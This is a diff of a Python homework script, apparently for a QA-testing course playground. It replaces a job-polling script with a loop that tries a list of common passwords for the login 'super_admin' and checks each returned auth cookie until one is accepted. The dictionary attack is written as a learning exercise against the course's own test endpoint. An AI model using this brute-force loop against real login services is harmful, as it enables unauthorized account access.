@@ -1,30 +1,28 @@
 import requests
-import time
 
-def create_job():
-    url = "https://playground.learnqa.ru/ajax/api/longtime_job"
-    response = requests.get(url)
-    return response.json()
+get_secret_password_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
+check_auth_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
 
-def check_status_and_result(token):
-    url = "https://playground.learnqa.ru/ajax/api/longtime_job"
-    params = {"token": token}
-    response = requests.get(url, params=params)
-    return response.json()
+login = "super_admin"
 
-print("1. Creating job")
-job_info = create_job()
-token = job_info["token"]
-seconds_to_wait = job_info["seconds"]
+common_passwords = [
+    "123456", "password", "123456789", "12345678", "12345",
+    "1234567", "1234567890", "qwerty", "abc123", "111111",
+    "123123", "admin", "letmein", "welcome", "monkey",
+    "1234", "super_admin", "123", "dragon", "123321",
+    "qwertyuiop", "123abc", "qwe123", "password1", "123qwe"
+]
 
-status_before_waiting = check_status_and_result(token)["status"]
-print(f"2. Status before waiting: {status_before_waiting}")
+for password in common_passwords:
+    response1 = requests.post(get_secret_password_url, data={"login": login, "password": password})
+    auth_cookie = response1.cookies.get("auth_cookie")
 
-time.sleep(seconds_to_wait)
+    response2 = requests.get(check_auth_cookie_url, cookies={"auth_cookie": auth_cookie})
 
-status_after_waiting = check_status_and_result(token)["status"]
-result_after_waiting = check_status_and_result(token).get("result")
-
-print(f"3. Status after waiting: {status_after_waiting}")
-if result_after_waiting:
-    print(f"4. Result after waiting: {result_after_waiting}")
+    if response2.text == "You are authorized":
+        print(f"Верный пароль: {password}")
+        print(f"Ответ от второго метода: {response2.text}")
+        break
+    else:
+        print(f"Неверный пароль: {password}")
+        print(f"Ответ от второго метода: {response2.text}")
